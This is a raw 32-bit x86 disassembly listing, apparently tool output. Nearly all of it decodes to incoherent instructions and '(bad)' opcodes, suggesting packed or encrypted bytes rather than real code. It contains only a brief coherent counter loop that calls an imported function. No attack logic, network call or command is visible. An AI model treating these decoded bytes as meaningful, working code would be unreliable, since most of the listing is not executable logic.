  410f33:	sar    BYTE PTR [edx],0xe9
  410f36:	xchg   esi,eax
  410f37:	push   edx
  410f38:	push   edx
  410f39:	inc    esi
  410f3a:	clc    
  410f3b:	or     DWORD PTR gs:[ebx+0x613a1c58],ecx
  410f42:	ja     0x410eeb
  410f44:	je     0x410f32
  410f46:	popa   
  410f47:	push   esp
  410f48:	cli    
  410f49:	dec    edi
  410f4a:	mov    bh,0xc1
  410f4c:	test   al,0x70
  410f4e:	inc    eax
  410f4f:	xlat   BYTE PTR ds:[ebx]
  410f50:	jl     0x410eff
  410f52:	or     eax,0x57ab38ce
  410f57:	xchg   DWORD PTR [esi],edi
  410f59:	xor    ecx,DWORD PTR [esi-0x487c5b7]
  410f5f:	inc    edi
  410f60:	mov    al,ds:0x3de5659f
  410f65:	sub    ax,0x2677
  410f69:	out    dx,al
  410f6a:	aad    0xc6
  410f6c:	(bad)  
  410f6e:	lea    ebx,[edx-0x665180ec]
  410f74:	mov    bh,0x3b
  410f76:	frstor [eax]
  410f78:	bound  ebx,QWORD PTR [ecx-0x3c]
  410f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f7c:	ins    DWORD PTR es:[edi],dx
  410f7d:	mov    esi,ebp
  410f7f:	sbb    BYTE PTR [esi],bl
  410f81:	add    BYTE PTR [edi],al
  410f83:	loopne 0x410fbe
  410f85:	pop    es
  410f86:	jbe    0x410ff5
  410f88:	dec    eax
  410f89:	out    dx,eax
  410f8a:	popa   
  410f8b:	arpl   WORD PTR [ebx+0x71017a1b],bp
  410f91:	js     0x410fc1
  410f93:	lods   eax,DWORD PTR ds:[esi]
  410f94:	sbb    esp,ebp
  410f96:	cmp    DWORD PTR [edx-0x5f],eax
  410f99:	sub    al,0xb2
  410f9b:	inc    ecx
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fe6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e21c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x17005559]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410ff5
  410fdd:	inc    ebp
  410fde:	sbb    al,BYTE PTR [edi-0x1ffb6659]
  410fe4:	arpl   WORD PTR [ebx],ax
  410fe6:	push   ebp
  410fe7:	dec    edx
  410fe8:	xor    al,0x51
  410fea:	push   ds
  410feb:	shr    DWORD PTR [esi],cl
  410fed:	fisttp QWORD PTR [eax-0x11]
  410ff0:	pop    DWORD PTR [ebp+0x5767d9e3]
  410ff6:	ret    0x56b7
  410ff9:	add    dl,ch
  410ffb:	repz mov edi,0x7424204f
  411001:	mov    edi,0x234c232f
  411006:	adc    BYTE PTR [di],ah
  411009:	in     eax,dx
  41100a:	call   0xb631:0xa2014158
  411011:	sub    al,0xa
  411013:	sti    
  411014:	mov    al,ds:0x78923a4c
  411019:	pop    esp
  41101a:	fdiv   QWORD PTR [ebx+0x7f55679a]
  411020:	(bad)  
  411021:	(bad)  
  411022:	sbb    BYTE PTR [edi],al
  411024:	dec    edx
  411025:	lahf   
  411026:	nop
  411027:	scas   al,BYTE PTR es:[edi]
  411028:	jecxz  0x410fed
  41102a:	cmc    
  41102b:	test   DWORD PTR [eax],edi
  41102d:	data16 aad 0xe6
  411030:	cld    
  411031:	aas    
  411032:	js     0x410fd3
  411034:	or     ch,ah
  411036:	push   0x5f805b5
  41103b:	mov    ebp,0xcf8deeae
  411040:	cdq    
  411041:	add    eax,0xcd9e752d
  411046:	sub    ah,BYTE PTR [eax+0x4557140d]
  41104c:	add    edi,DWORD PTR [ebp+0x20f5bb51]
  411052:	(bad)  
  411053:	pop    edi
  411054:	mov    bh,0xa1
  411056:	or     ebx,DWORD PTR [ecx]
  411058:	lea    edi,[edi+0x2]
  41105b:	mov    esp,0x76f23d9
  411060:	cdq    
  411061:	mov    esi,0xfa026510
  411066:	cld    
  411067:	fcomip st,st(6)
  411069:	xchg   DWORD PTR [edx-0x4f],esp
  41106c:	jno    0x411087
  41106e:	mov    ecx,0x4f205303
  411073:	scas   al,BYTE PTR es:[edi]
  411074:	sbb    ebx,DWORD PTR [eax+edi*8+0x58f1aa92]
  41107b:	sub    cl,BYTE PTR [esi-0x4fce0d1b]
  411081:	cvtps2pi mm0,QWORD PTR [eax]
  411084:	into   
  411085:	test   ch,ch
  411087:	add    edx,DWORD PTR [esi+0x719c454c]
  41108d:	or     DWORD PTR [ebp-0x36],edi
  411090:	mov    ds:0xaaccaf0a,eax
  411095:	fst    st(7)
  411097:	or     BYTE PTR [ebx+0x39017916],dh
  41109d:	jae    0x411057
  41109f:	scas   eax,DWORD PTR es:[edi]
  4110a0:	push   edi
  4110a1:	mov    ah,0x9d
  4110a3:	push   edi
  4110a4:	adc    al,0x5
  4110a6:	xchg   ebx,eax
  4110a7:	inc    ecx
  4110a8:	test   DWORD PTR ds:0xf41c044e,0x25fc5c92
  4110b2:	cmp    DWORD PTR [edi],ecx
  4110b4:	rol    DWORD PTR [edi-0x5362bb65],cl
  4110ba:	xchg   edx,eax
  4110bb:	daa    
  4110bc:	jecxz  0x4110f3
  4110be:	ror    DWORD PTR [edi],0x93
  4110c1:	sub    cl,BYTE PTR [ebp-0x359bc450]
  4110c7:	fcom   DWORD PTR [edi+0x1af61f43]
  4110cd:	pop    ds
  4110ce:	mov    es,edx
  4110d0:	int    0x22
  4110d2:	or     al,0xb6
  4110d4:	lahf   
  4110d5:	call   FWORD PTR [edi-0x4]
  4110d8:	out    dx,eax
  4110d9:	outs   dx,BYTE PTR ds:[esi]
  4110da:	iret   
  4110db:	lds    edx,FWORD PTR [ebp+edi*4+0x58]
  4110df:	jae    0x4110ff
  4110e1:	mov    al,0xab
  4110e3:	sub    al,0x4d
  4110e5:	les    eax,FWORD PTR [ebp-0x18]
  4110e8:	jns    0x4110b9
  4110ea:	sbb    DWORD PTR [eax],esp
  4110ec:	xor    al,0x4b
  4110ee:	adc    edi,0xffffffe2
  4110f1:	imul   ecx,DWORD PTR [esi+0x4a],0x8a16ac7c
  4110f8:	mov    ds:0x5eeab2ff,eax
  4110fd:	sbb    esp,esp
  4110ff:	sbb    ch,BYTE PTR [eax]
  411101:	push   0xa1cd8237
  411106:	cwde   
  411107:	nop
  411108:	add    edi,DWORD PTR [eax]
  41110a:	push   edi
  41110b:	ins    BYTE PTR es:[edi],dx
  41110c:	adc    al,0x3c
  41110e:	add    BYTE PTR [ecx+0x5a],bl
  411111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411112:	pop    esp
  411113:	loop   0x4110f0
  411115:	out    0xd6,al
  411117:	sahf   
  411118:	enter  0x63d5,0x28
  41111c:	fist   DWORD PTR [ecx+0x62ec6b22]
  411122:	push   ebx
  411123:	mov    eax,0x4eca22e
  411128:	dec    ebp
  411129:	xor    BYTE PTR [eax+edx*1-0x71],al
  41112d:	mov    ah,0xf8
  41112f:	pusha  
  411130:	push   es
  411131:	into   
  411132:	enter  0x70bb,0x80
  411136:	adc    esp,DWORD PTR [edx]
  411138:	shr    DWORD PTR [edx],1
  41113a:	jb     0x411159
  41113c:	fwait
  41113d:	sbb    DWORD PTR [edi+0x2911f2a0],esi
  411143:	sbb    eax,0x2d8940b6
  411148:	mov    dl,BYTE PTR [eax-0x4a47997]
  41114e:	dec    esp
  41114f:	aad    0x1d
  411151:	(bad)
  411154:	sahf   
  411155:	not    DWORD PTR [ecx+0x10]
  411158:	push   ds
  411159:	pushf  
  41115a:	(bad)  
  41115b:	scas   eax,DWORD PTR es:[edi]
  41115c:	sbb    al,0x5b
  41115e:	or     ecx,DWORD PTR [ebx-0x2e392904]
  411164:	(bad)  
  411165:	idiv   al
  411167:	push   ss
  411168:	lahf   
  411169:	repz frstor [eax-0x92f492b]
  411170:	(bad)  
  411171:	xchg   esp,eax
  411172:	mov    ds:0x80c6d60c,eax
  411177:	push   ecx
  411178:	popa   
  411179:	or     bl,BYTE PTR [ebx]
  41117b:	and    eax,0x2e7e59f9
  411180:	jmp    0xaf00b310
  411185:	fcmovnu st,st(5)
  411187:	cmp    esi,ecx
  411189:	pop    ecx
  41118a:	sbb    eax,0xd2cd3368
  41118f:	dec    edx
  411190:	and    bp,cx
  411193:	stos   BYTE PTR es:[edi],al
  411194:	sub    edx,DWORD PTR [eax]
  411196:	in     al,dx
  411197:	jmp    0x7ff9aac1
  41119c:	mov    al,0x5f
  41119e:	xchg   esi,eax
  41119f:	pop    edi
  4111a0:	retf   
  4111a1:	das    
  4111a2:	jb     0x41120d
  4111a4:	mov    ds:0x892ead28,al
  4111a9:	popa   
  4111aa:	mov    cl,0xd4
  4111ac:	jmp    0x41118b
  4111ae:	sbb    ah,BYTE PTR [edi]
  4111b0:	fbstp  TBYTE PTR [ebp-0x44ac95be]
  4111b6:	add    esi,DWORD PTR [eax+0x51d640f6]
  4111bc:	or     al,0x93
  4111be:	ret    0x1b13
  4111c1:	sbb    ah,BYTE PTR [edx]
  4111c3:	popf   
  4111c4:	test   BYTE PTR [esp+ebp*2-0x3a63cd78],ch
  4111cb:	int    0x10
  4111cd:	ins    BYTE PTR es:[edi],dx
  4111ce:	mov    ds:0x337f041,eax
  4111d3:	inc    ebx
  4111d4:	add    eax,0xcd14fded
  4111d9:	or     bh,dh
  4111db:	add    eax,0x2cccf120
  4111e0:	js     0x4111e1
  4111e2:	jb     0x411167
  4111e4:	or     esi,DWORD PTR [edi]
  4111e6:	dec    ecx
  4111e7:	add    edi,0xffffffb9
  4111ea:	pop    ebp
  4111eb:	inc    ecx
  4111ec:	sub    BYTE PTR [edi],ch
  4111ee:	ja     0x41118b
  4111f0:	inc    BYTE PTR [ebx]
  4111f2:	fcom   DWORD PTR [eax-0x7a]
  4111f5:	fucomi st,st(3)
  4111f7:	(bad)  
  4111f8:	jb     0x4111fe
  4111fa:	push   esp
  4111fb:	inc    edi
  4111fc:	gs aad 0xff
  4111ff:	(bad)  
  411200:	xor    esp,DWORD PTR [eax-0x28]
  411203:	xchg   ecx,eax
  411204:	test   DWORD PTR [ebx],ecx
  411206:	xor    DWORD PTR [esi],ecx
  411208:	nop
  411209:	repz mov ebp,0x7a1e64bd
  41120f:	xchg   ebp,eax
  411210:	aam    0x59
  411212:	sbb    DWORD PTR [edx-0x4a8792da],edi
  411218:	mov    ss,WORD PTR [ebp+edx*8+0xa113332]
  41121f:	gs push esp
  411221:	mov    al,ds:0x449ca7ff
  411226:	mov    edx,esi
  411228:	xchg   DWORD PTR [ecx-0x40],ebx
  41122b:	xchg   edx,eax
  41122c:	(bad)  
  41122d:	mov    dl,0x25
  41122f:	pop    eax
  411230:	ins    DWORD PTR es:[edi],dx
  411231:	ret    0x7a7a
  411234:	aaa    
  411235:	les    esp,FWORD PTR [edi]
  411237:	pop    ecx
  411238:	xor    DWORD PTR [edx-0x6ca57ee0],esp
  41123e:	icebp  
  41123f:	dec    eax
  411240:	xchg   esp,eax
  411241:	test   BYTE PTR [esi],dl
  411243:	jmp    0x411249
  411245:	das    
  411246:	xchg   DWORD PTR ds:0xd05eae90,esp
  41124c:	jp     0x41127c
  41124e:	and    esp,ebx
  411250:	xchg   ebp,eax
  411251:	xor    esp,ebx
  411253:	test   BYTE PTR [ebx-0x488359bf],ah
  411259:	jno    0x41126a
  41125b:	mov    edi,0x445aa660
  411260:	or     BYTE PTR [eax+0x47fb1101],al
  411266:	stos   DWORD PTR es:[edi],eax
  411267:	int    0x51
  411269:	pop    esi
  41126a:	adc    al,0xf4
  41126c:	ss xor cl,ch
  41126f:	loope  0x4112be
  411271:	fild   DWORD PTR [eax+esi*4]
  411274:	push   cs
  411275:	pop    edx
  411276:	fidivr DWORD PTR [ebp-0x97ae407]
  41127c:	addr16 xchg esp,eax
  41127e:	js     0x41125d
  411280:	imul   edi,DWORD PTR [ebx-0x9],0x89a47467
  411287:	sbb    ebx,DWORD PTR [edi+0xb76cd0d]
  41128d:	jno    0x4112bb
  41128f:	mov    esp,0xa3f6c0da
  411294:	hlt    
  411295:	in     eax,dx
  411296:	pop    esi
  411297:	lock xchg edi,eax
  411299:	add    al,0xb0
  41129b:	in     al,dx
  41129c:	test   eax,0x8fd00597
  4112a1:	jg     0x4112f0
  4112a3:	data16 xlat BYTE PTR ds:[ebx]
  4112a5:	sub    BYTE PTR [edx+0x992c18c],0x12
  4112ac:	mov    BYTE PTR [eax-0x3e],0x3d
  4112b0:	jns    0x411265
  4112b2:	xchg   ebp,eax
  4112b3:	in     eax,dx
  4112b4:	cmp    DWORD PTR [edi+0x6c],edi
  4112b7:	pop    esp
  4112b8:	cwde   
  4112b9:	mov    bl,0x75
  4112bb:	and    eax,0xe6fb331
  4112c0:	mov    ebp,0xc3ec3b69
  4112c5:	je     0x411253
  4112c7:	add    BYTE PTR [esi+0x45],ch
  4112ca:	je     0x411256
  4112cc:	leave  
  4112cd:	ins    DWORD PTR es:[edi],dx
  4112ce:	inc    ebp
  4112cf:	and    ebx,ebp
  4112d1:	ror    esp,0x89
  4112d4:	sbb    ch,BYTE PTR [edx]
  4112d6:	int3   
  4112d7:	push   edx
  4112d8:	push   0x7a
  4112da:	jb     0x411336
  4112dc:	jg     0x411355
  4112de:	mov    dl,0x6b
  4112e0:	call   0xc147:0x6cc87e8f
  4112e7:	jecxz  0x41128c
  4112e9:	call   0x7f03:0x482bbbe8
  4112f0:	fld    DWORD PTR [edi-0x7e]
  4112f3:	adc    al,0xce
  4112f5:	mov    bh,0xca
  4112f7:	mov    ch,0xfb
  4112f9:	mov    al,ds:0x178d9f11
  4112fe:	rcl    ah,1
  411300:	les    esp,FWORD PTR [ecx-0x5a41375f]
  411306:	push   0x398222a8
  41130b:	cmovno edi,DWORD PTR [edi-0x74]
  41130f:	xchg   esi,eax
  411310:	cld    
  411311:	and    eax,0x333f0070
  411316:	pop    edx
  411317:	stc    
  411318:	pop    edi
  411319:	inc    esp
  41131a:	sbb    al,0xc5
  41131c:	pusha  
  41131d:	and    al,0xdf
  41131f:	test   al,0x2e
  411321:	lahf   
  411322:	dec    ecx
  411323:	loopne 0x411306
  411325:	outs   dx,BYTE PTR ds:[esi]
  411326:	imul   esi,DWORD PTR [edx-0x79],0xffffffd6
  41132a:	pop    ebx
  41132b:	shl    dl,0xee
  41132e:	data16 data16 repnz in al,dx
  411332:	mov    ds:0x9779a8c9,al
  411337:	ins    DWORD PTR es:[di],dx
  411339:	adc    bl,BYTE PTR [esi]
  41133b:	push   edx
  41133c:	mov    ecx,0xde9acf5e
  411341:	jp     0x41132b
  411343:	cmp    eax,0x70a30e51
  411348:	mov    eax,gs:0x52c8b493
  41134e:	dec    eax
  41134f:	push   ecx
  411350:	mov    esi,DWORD PTR [ebp+0x4c]
  411353:	aaa    
  411354:	cmc    
  411355:	dec    esi
  411356:	or     al,0x1
  411358:	dec    ecx
  411359:	push   es
  41135a:	hlt    
  41135b:	stos   BYTE PTR es:[edi],al
  41135c:	fist   DWORD PTR [ebp-0x43cd2c43]
  411362:	retf   
  411363:	shl    DWORD PTR [eax-0x31],0x5b
  411367:	mov    ds:0xeb235352,al
  41136c:	fadd   DWORD PTR [ebx-0x64]
  41136f:	(bad)  [edi+edx*8-0x15]
  411373:	and    esp,DWORD PTR [ebx]
  411375:	dec    esp
  411376:	popa   
  411377:	mov    bh,0x1d
  411379:	push   ebp
  41137a:	(bad)  
  41137b:	into   
  41137c:	xor    bl,BYTE PTR [edi]
  41137e:	mov    esp,0x74d7116b
  411383:	inc    edx
  411384:	inc    edx
  411385:	loopne 0x41136f
  411387:	xchg   ebp,eax
  411388:	add    dh,dh
  41138a:	pop    ebp
  41138b:	sbb    eax,DWORD PTR [eax-0x2a]
  41138e:	aam    0xe1
  411390:	jbe    0x411330
  411392:	push   esp
  411393:	adc    ebp,edi
  411395:	sbb    eax,0x35b361da
  41139a:	test   al,0x61
  41139c:	jecxz  0x4113e7
  41139e:	sub    BYTE PTR [ecx],al
  4113a0:	sar    BYTE PTR [ecx+0x7346496c],0x22
  4113a7:	je     0x411381
  4113a9:	mov    ds:0x189cdb55,al
  4113ae:	xchg   esi,eax
  4113af:	adc    eax,0xb090e735
  4113b4:	push   cs
  4113b5:	(bad)  
  4113b6:	lea    ebp,[ebx]
  4113b8:	mov    BYTE PTR [eax+0xc],0x5d
  4113bc:	in     al,dx
  4113bd:	pop    ebp
  4113be:	push   ds
  4113bf:	mov    al,0x53
  4113c1:	xchg   DWORD PTR cs:[ecx+0x5c7c63b],ecx
  4113c8:	icebp  
  4113c9:	std    
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fe7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fe7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fe7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fe7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e2e7
  411404:	push   0x42e36d
  411409:	call   DWORD PTR ds:0x42e667
  41140f:	cmp    DWORD PTR ds:0x42fe7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fe7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fe7a,esi
  411429:	cmp    DWORD PTR ds:0x42fe7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	jae    0x41143e
  411449:	test   DWORD PTR [esi+0x70704a0e],0x70707d58
  411453:	loopne 0x41142f
  411455:	aam    0x90
  411457:	sbb    al,0x9a
  411459:	jmp    0x411467
  41145b:	clc    
  41145c:	jmp    0x1640:0x445429ea
  411463:	push   edi
  411464:	(bad)  [eax]
  411466:	test   BYTE PTR [esi],al
  411468:	lds    edx,FWORD PTR [esi-0x47e916d0]
  41146e:	sbb    al,0x10
  411470:	test   esp,edx
  411472:	cmp    al,0xbe
  411474:	mov    eax,DWORD PTR [esi-0x7e]
  411477:	inc    esp
  411478:	jo     0x411468
  41147a:	xor    dh,BYTE PTR [edi+0x208bea2d]
  411480:	popa   
  411481:	out    0x8d,al
  411483:	sbb    esp,edx
  411485:	jg     0x4114d7
  411487:	dec    edx
  411488:	popa   
  411489:	je     0x4114f5
  41148b:	bound  esi,QWORD PTR [di+0x2710]
  411490:	jo     0x411467
  411492:	push   ecx
  411493:	push   ss
  411494:	data16 mov cl,0x80
  411497:	push   ds
  411498:	ror    edx,1
  41149a:	mov    al,0x69
  41149c:	enter  0x652a,0x2a
  4114a0:	jnp    0x4114cb
  4114a2:	or     DWORD PTR [edi],eax
  4114a4:	cmp    eax,0x94f36157
  4114a9:	fucomi st,st(5)
  4114ab:	and    ecx,DWORD PTR [eax+0x3afb5019]
  4114b1:	out    0xf7,eax
  4114b3:	dec    esi
  4114b4:	push   ds
  4114b5:	or     eax,0x131d380f
  4114ba:	inc    ecx
  4114bb:	push   ds
  4114bc:	sub    DWORD PTR [esi+0x297ece79],ebp
  4114c2:	fisttp DWORD PTR ss:[eax]
  4114c5:	test   ebp,ecx
  4114c7:	mov    ?,WORD PTR [esi-0x45]
  4114ca:	div    BYTE PTR [eax+0x37]
  4114cd:	(bad)  
  4114ce:	out    dx,al
  4114cf:	jns    0x41151b
  4114d1:	push   esi
  4114d2:	(bad)  
  4114d3:	aad    0xdf
  4114d5:	ins    DWORD PTR es:[edi],dx
  4114d6:	stos   BYTE PTR es:[edi],al
  4114d7:	xchg   ebx,eax
  4114d8:	or     al,0x48
  4114da:	add    bh,bl
  4114dc:	pop    ds
  4114dd:	pop    ebx
  4114de:	adc    bh,BYTE PTR [ebx]
  4114e0:	cmp    al,0x9
  4114e2:	clc    
  4114e3:	adc    BYTE PTR [ebp+0x1f],bl
  4114e6:	cwde   
  4114e7:	shl    BYTE PTR [ebx-0x5c8879cf],1
  4114ed:	call   0xdbca:0xdc675054
  4114f4:	mov    esi,0x69a64dd5
  4114f9:	adc    eax,0x1e4963af
  4114fe:	pop    es
  4114ff:	xchg   esi,ecx
  411501:	fwait
  411502:	and    bh,ah
  411504:	add    dh,BYTE PTR [ebx]
  411506:	mov    al,0xf4
  411508:	sub    ebp,DWORD PTR [eax+0x68]
  41150b:	inc    eax
  41150c:	dec    ebx
  41150d:	stos   BYTE PTR es:[edi],al
  41150e:	in     eax,dx
  41150f:	mov    esp,0x4a89a8b7
  411514:	mov    ch,0x37
  411516:	xor    al,0xc5
  411518:	push   ebx
  411519:	test   BYTE PTR [esi-0x55],ah
  41151c:	(bad)  
  41151d:	aaa    
  41151e:	push   ebx
  41151f:	jne    0x411565
  411521:	mov    bl,0xeb
  411523:	push   ebp
  411524:	ret    0x8839
  411527:	and    BYTE PTR [ebp+0x11],ah
  41152a:	push   eax
  41152b:	mov    eax,ds:0xf7a0abfe
  411530:	push   edi
  411531:	adc    ch,BYTE PTR [ebx+0x69]
  411534:	addr16 inc esi
  411536:	outs   dx,DWORD PTR ds:[esi]
  411537:	push   ebx
  411538:	add    dh,BYTE PTR [ebx+0x58]
  41153b:	btr    DWORD PTR [eax-0x2c5711a3],edx
  411542:	jns    0x411502
  411544:	xchg   esi,eax
  411545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411546:	jle    0x41156b
  411548:	xchg   ebp,eax
  411549:	mov    ecx,0xfdb5f87b
  41154e:	fcom   QWORD PTR [ebx+edi*4]
  411551:	mov    ebx,0x5ce69c5
  411556:	add    eax,0xa46fb995
  41155b:	loope  0x411506
  41155d:	clc    
  41155e:	mov    ecx,0xa62850e3
  411563:	xor    al,0x5b
  411565:	retf   0xd529
  411568:	xchg   edi,eax
  411569:	(bad)  
  41156a:	fistp  DWORD PTR [eax-0x121c135b]
  411570:	jae    0x411568
  411572:	mov    ds:0xac705403,al
  411577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411578:	arpl   WORD PTR [ebp-0x2d],dx
  41157b:	idiv   DWORD PTR [edx-0x49]
  41157e:	xchg   ebx,eax
  41157f:	mov    ds:0xd32992d4,eax
  411584:	mov    WORD PTR [ebp+ecx*2-0x72],?
  411588:	es sbb eax,0x13de8685
  41158e:	repnz add ecx,ecx
  411591:	push   0xffffff8d
  411593:	mul    BYTE PTR [edi+0xb]
  411596:	adc    eax,0x45cd49ec
  41159b:	and    bh,ch
  41159d:	std    
  41159e:	xchg   ecx,eax
  41159f:	dec    ebp
  4115a0:	add    bh,BYTE PTR [eax+0x77]
  4115a3:	ret    0xb208
  4115a6:	mov    ebp,0x9b16f75a
  4115ab:	cmp    al,0x8c
  4115ad:	push   ss
  4115ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115af:	popa   
  4115b0:	or     al,0x48
  4115b2:	pop    es
  4115b3:	adc    al,BYTE PTR [ebx-0x5190f7dd]
  4115b9:	iret   
  4115ba:	icebp  
  4115bb:	imul   esp,DWORD PTR [edi-0x557d622b],0x89ac816d
  4115c5:	mov    ecx,0xa0176f0f
  4115ca:	mov    ah,bh
  4115cc:	pop    ecx
  4115cd:	fld    QWORD PTR [edx]
  4115cf:	fisubr DWORD PTR [edx]
  4115d1:	lahf   
  4115d2:	adc    eax,0x139a9341
  4115d8:	inc    esp
  4115d9:	les    ebp,FWORD PTR [ebp-0x24a72608]
  4115df:	in     al,dx
  4115e0:	jmp    0x4019:0x5c5af74b
  4115e7:	(bad)  
  4115e8:	pusha  
  4115e9:	ja     0x41157f
  4115eb:	add    eax,0xee341865
  4115f0:	mov    cs,WORD PTR [ebx+0x7490b815]
  4115f6:	sbb    edi,DWORD PTR fs:[ecx-0x6669d07c]
  4115fd:	imul   esp,DWORD PTR [ebx],0xf8b6cfa3
  411603:	sub    cl,bh
  411605:	dec    ebp
  411606:	push   ebx
  411607:	sbb    edi,esi
  411609:	add    DWORD PTR [ecx-0x1f],eax
  41160c:	mov    bh,0xc1
  41160e:	lods   al,BYTE PTR ds:[esi]
  41160f:	mov    BYTE PTR [ebx],ch
  411611:	cmp    eax,DWORD PTR [edi+0x45]
  411614:	mov    ebp,0x9d7f25a3
  411619:	std    
  41161a:	mov    bl,0x54
  41161c:	push   ds
  41161d:	lahf   
  41161e:	pop    ebp
  41161f:	repnz test BYTE PTR [ebx-0x6d],ah
  411623:	stos   BYTE PTR es:[edi],al
  411624:	inc    edi
  411625:	mov    DWORD PTR [ebp+0xd],eax
  411628:	mov    al,0xdf
  41162a:	or     DWORD PTR [eax+eiz*4+0x53],esi
  41162e:	pushf  
  41162f:	add    al,0x2b
  411631:	les    eax,FWORD PTR [edi]
  411633:	ret    0x433c
  411636:	or     al,0x41
  411638:	jmp    0xebe18e29
  41163d:	scas   eax,DWORD PTR es:[edi]
  41163e:	inc    ecx
  41163f:	shr    ah,1
  411641:	mov    esp,0x816ed199
  411646:	or     ecx,DWORD PTR [edi]
  411648:	add    esi,DWORD PTR [ecx]
  41164a:	mul    edx
  41164c:	and    BYTE PTR [ecx],al
  41164e:	fist   WORD PTR [ebx-0x34]
  411651:	inc    edi
  411652:	pushf  
  411653:	js     0x41162a
  411655:	test   esi,esp
  411657:	push   ebx
  411658:	pop    esp
  411659:	xor    ebp,DWORD PTR [ecx-0x6d]
  41165c:	scas   al,BYTE PTR es:[edi]
  41165d:	or     ah,BYTE PTR [ebx+0x16507a7d]
  411663:	jb     0x411616
  411665:	push   esp
  411666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411667:	mov    ah,0xe9
  411669:	mov    ds:0x2397a647,eax
  41166e:	pop    edx
  41166f:	or     al,0xbd
  411671:	mov    esi,DWORD PTR [ebx+0x48]
  411674:	sti    
  411675:	aad    0xf8
  411677:	mov    es,edi
  411679:	xchg   DWORD PTR ds:0xfd30ad92,ecx
  41167f:	ins    BYTE PTR es:[edi],dx
  411680:	mov    dl,0x91
  411682:	lods   eax,DWORD PTR ds:[esi]
  411683:	std    
  411684:	imul   edx,DWORD PTR [ebp+0x2356410c],0xffffff84
  41168b:	pushf  
  41168c:	aas    
  41168d:	sbb    ebp,DWORD PTR [edx+0x7b]
  411690:	loopne 0x41168f
  411692:	in     eax,dx
  411693:	pushw  ds
  411695:	ja     0x41167c
  411697:	call   0xaf14:0x8aea808
  41169e:	or     ch,BYTE PTR [ebp+0x1a]
  4116a1:	nop
  4116a2:	test   eax,0xf792f288
  4116a7:	inc    edi
  4116a8:	mov    dl,0x42
  4116aa:	jp     0x41165d
  4116ac:	test   BYTE PTR [edi+0x61160c5a],ch
  4116b2:	fsubr  QWORD PTR [edx]
  4116b4:	push   eax
  4116b5:	mov    bh,0x81
  4116b7:	hlt    
  4116b8:	or     bl,BYTE PTR [ecx+0x71991780]
  4116be:	ja     0x411668
  4116c0:	xor    DWORD PTR [ebp-0x56],ebx
  4116c3:	inc    eax
  4116c4:	jno    0x411731
  4116c6:	pop    edx
  4116c7:	dec    ebx
  4116c8:	sub    ebx,DWORD PTR [ebx]
  4116ca:	daa    
  4116cb:	xor    bl,BYTE PTR [ebp+0x4a]
  4116ce:	inc    ebx
  4116cf:	out    0x4f,eax
  4116d1:	test   ch,bh
  4116d3:	in     eax,dx
  4116d4:	mov    ds:0xd2fefe38,al
  4116d9:	push   eax
  4116da:	and    ecx,DWORD PTR [ebx]
  4116dc:	test   DWORD PTR [esi],ecx
  4116de:	ins    BYTE PTR es:[edi],dx
  4116df:	lods   al,BYTE PTR ds:[esi]
  4116e0:	ret    
  4116e1:	sbb    ebp,DWORD PTR [eax-0x3a428c64]
  4116e7:	jle    0x4116a4
  4116e9:	jne    0x4116f5
  4116eb:	or     edi,DWORD PTR [ebx-0x5b]
  4116ee:	adc    eax,0xc81992e1
  4116f3:	pop    ds
  4116f4:	mov    eax,0xf08065e5
  4116f9:	pop    eax
  4116fa:	ficom  DWORD PTR [ebx]
  4116fc:	bound  esp,QWORD PTR [edx-0x5c]
  4116ff:	shl    DWORD PTR [ebp-0x3f],cl
  411702:	not    BYTE PTR [ebx+0x3]
  411705:	mov    bl,0xb0
  411707:	cmp    edx,DWORD PTR [ebp-0x4827acbc]
  41170d:	cdq    
  41170e:	sbb    esi,DWORD PTR [edi-0x59be3172]
  411714:	jb     0x4116ab
  411716:	xor    bl,ch
  411718:	in     al,dx
  411719:	sbb    ch,al
  41171b:	dec    esp
  41171c:	sbb    edi,DWORD PTR [eax+0x1a8b3367]
  411722:	xor    al,0x4c
  411724:	stos   BYTE PTR es:[edi],al
  411725:	inc    ecx
  411726:	adc    al,BYTE PTR [eax-0x25]
  411729:	adc    eax,esp
  41172b:	xchg   edi,eax
  41172c:	in     eax,dx
  41172d:	mov    eax,0x826f302c
  411732:	pop    ecx
  411733:	pop    esi
  411734:	cmp    cl,0xd0
  411737:	or     al,0x53
  411739:	xchg   ebx,eax
  41173a:	sub    cl,bh
  41173c:	mov    ecx,0xe72f09bc
  411741:	mov    al,ds:0x736facc7
  411746:	inc    ebx
  411747:	mov    ah,0x79
  411749:	pop    edx
  41174a:	cld    
  41174b:	mov    ds:0xf8ae4ea3,eax
  411750:	xchg   ecx,eax
  411751:	pusha  
  411752:	js     0x4116df
